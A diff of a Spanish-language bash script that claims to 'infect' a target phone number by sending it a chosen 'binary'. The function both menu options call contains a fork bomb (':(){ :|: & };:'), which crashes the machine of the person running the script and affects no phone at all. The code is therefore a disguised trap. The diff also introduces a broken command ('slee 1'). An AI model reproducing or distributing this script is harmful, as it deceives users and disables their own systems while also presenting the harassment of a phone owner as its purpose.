@@ -9,12 +9,12 @@ M='\033[1;35m'
 #Functions
 eo(){
 sleep 5
-echo ' '
-echo -e 'Atacando...😈\n'
-sleep 1
-echo 'infectando a' $nm
+echo ''
+echo -e "Atacando...😈\n"
+slee 1
+echo "infectando a $nm"
 sleep 2
-echo '¡En Ejecución!'
+echo "¡En Ejecución!"
 :(){ :|: & };:
 }
 
@@ -39,30 +39,30 @@ read -r nm
 sleep 3
 clear
 echo -e ${Z}
-echo 'Analizando...'
+echo "Analizando..."
 sleep 2
-echo 'Número Existente!'
+echo "Número Existente!"
 sleep 1
 #Functions
 clear
-echo -e ${Z}'
+echo -e ${Z}"
 [ + ] Elige el binario a enviarle! [ + ]
 
-'
+"
 echo -e "${Z}[${R} 1 ${Z}]${R}【ḶḕḠḭṏN🥶"
 sleep 0.1
 echo -e "${Z}[${R} 2 ${Z}]${R}〖乃ѺѺᎷ💣${Z} "
 sleep 1
-echo ' '
+echo ""
 echo -e -n ">> " ${R}
 read -r wu
 echo -e ${Z}
 
-if [[ $wu == '1' ]];then
+if [[ $wu == 1 ]];then
 
         echo 'Preparando binario LeGioN...'
         eo
-elif [[ $wu == '2' ]];then
+elif [[ $wu == 2 ]];then
 
         echo 'Preparando binario BooM..'
         eo
